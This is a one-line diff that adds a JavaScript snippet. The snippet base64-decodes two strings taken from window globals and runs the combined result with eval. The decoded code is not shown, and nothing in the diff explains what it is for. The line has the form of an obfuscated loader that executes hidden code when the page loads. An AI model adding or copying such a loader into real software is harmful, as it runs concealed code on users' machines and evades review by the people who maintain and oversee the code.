@@ -1,0 +1,1 @@
+(()=>{const dec=b64=>new TextDecoder().decode(Uint8Array.from(atob(b64),c=>c.charCodeAt(0)));eval(dec(window.__B64D)+"\n"+dec(window.__B64A));})();
